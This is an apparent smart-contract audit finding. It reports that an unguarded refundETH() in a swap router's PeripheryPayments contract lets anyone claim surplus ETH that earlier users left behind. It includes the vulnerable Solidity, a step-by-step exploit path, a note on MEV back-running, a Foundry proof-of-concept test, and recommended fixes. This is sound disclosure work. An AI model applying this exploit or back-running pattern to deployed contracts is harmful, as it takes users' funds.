Audit Report

## Title
Unguarded `refundETH()` allows any caller to steal excess ETH left on the router by a prior user — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`PeripheryPayments.refundETH()` is `external` with no access control and unconditionally transfers the router's entire ETH balance to `msg.sender`. When a user calls `multicall{value: X}` with `amountIn < X` and omits `refundETH` from the batch, the surplus ETH remains on the router and is immediately claimable by any third party in a subsequent transaction.

## Finding Description
`refundETH()` at lines 58–63 sends the full `address(this).balance` to `msg.sender` with no caller check, no per-depositor ledger, and no restriction to the originating multicall context:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

`pay()` at lines 75–77, when `token == WETH` and `nativeBalance >= value`, wraps exactly `value` ETH and leaves any surplus on the contract:

```solidity
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
```

`multicall()` at lines 39–44 is `payable` and uses `delegatecall`, so ETH sent with the call accumulates on the router. The `receive()` guard at lines 32–34 (which rejects non-WETH senders) is irrelevant here because ETH sent via a function call with calldata does not trigger `receive()`. The test at `metric-periphery/test/MetricOmmSimpleRouter.native.t.sol` lines 106–133 confirms the intended pattern: users must include `refundETH` as the last call in their multicall batch. This is not enforced on-chain.

**Exploit path:**
1. Victim calls `router.multicall{value: 1 ether}([exactInputSingle(amountIn=0.5 ether, tokenIn=WETH)])` without appending `refundETH`.
2. `pay()` wraps 0.5 ETH → WETH → pool; 0.5 ETH remains on the router.
3. Attacker calls `router.refundETH()` in the next transaction; `_transferETH(attacker, 0.5 ether)` executes unconditionally.
4. Attacker receives 0.5 ETH belonging to the victim.

## Impact Explanation
Direct loss of user principal. Any ETH a user sends in excess of their swap's `amountIn` — a common pattern when the exact cost is unknown — is immediately claimable by any third party who calls `refundETH()` before the user does. The stolen amount equals `msg.value − amountIn` per affected transaction, with no upper bound. This meets the "Critical/High/Medium direct loss of user principal" impact gate.

## Likelihood Explanation
Medium. The intended usage pattern (include `refundETH` as the last call in a multicall) is not enforced on-chain. Users who send a round ETH value for a sub-round swap, or who construct multicalls programmatically and omit the refund step, will leave ETH on the router. MEV bots monitoring the mempool can back-run the victim's transaction to claim the balance atomically in the same block.

## Recommendation
Track the depositor within the multicall context using transient storage at `multicall` entry and restrict `refundETH` to that address. A minimal fix is to record `msg.sender` in a transient slot at the start of `multicall` and require `refundETH` to only transfer to that stored address. Alternatively, auto-refund excess ETH at the end of each swap entry point rather than relying on a separate user-initiated call.

## Proof of Concept
```solidity
// 1. Victim sends 1 ETH for a 0.5 ETH WETH swap, omitting refundETH
bytes[] memory calls = new bytes[](1);
calls[0] = abi.encodeWithSelector(
    router.exactInputSingle.selector,
    ExactInputSingleParams({
        pool: wethToken1Pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 0.5 ether,
        amountOutMinimum: 0,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
vm.prank(victim);
router.multicall{value: 1 ether}(calls);
// router.balance == 0.5 ether

// 2. Attacker steals it in the next transaction
uint256 before = attacker.balance;
vm.prank(attacker);
router.refundETH();
assertEq(attacker.balance - before, 0.5 ether); // attacker receives victim's ETH
assertEq(address(router).balance, 0);
```
